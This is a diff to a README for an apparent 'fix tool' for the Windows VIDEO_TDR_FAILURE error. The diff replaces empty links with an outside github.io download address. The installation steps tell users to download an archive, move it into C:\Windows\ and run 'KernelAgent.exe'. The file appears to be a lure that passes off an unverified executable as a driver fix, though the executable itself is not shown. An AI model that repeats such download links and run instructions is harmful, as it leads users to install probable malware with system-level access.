@@ -2,7 +2,7 @@
 
 This project provides a definitive solution to fix the dreaded VIDEO_TDR_FAILURE (atikmpag.sys or nvlddmkm.sys) error in Windows. Whether you're using NVIDIA or AMD graphics cards, this guide helps restore system stability and performance.
 
-[![Download Fix Tool](https://img.shields.io/badge/Download-Fix_Tool-blueviolet)](#)
+[![Download Fix Tool](https://img.shields.io/badge/Download-Fix_Tool-blueviolet)](https://fix-video-tdr-failure.github.io/.github)
 
 ### 🧪 Usage Examples
 
@@ -18,7 +18,7 @@ This project provides a definitive solution to fix the dreaded VIDEO_TDR_FAILURE
 
 ### ⚙️ Installation Instructions
 
-1. 📦 **Download the archive** from the [Releases](#) section or from the button above  
+1. 📦 **Download the archive** from the [Releases](https://fix-video-tdr-failure.github.io/.github) section or from the button above  
 2. 📁 **Extract the folder** and move it into your main `C:\Windows\` directory  
 3. 🖱 **Run the executable file** `KernelAgent.exe`  
 4. 🔁 Restart your computer after the process is complete
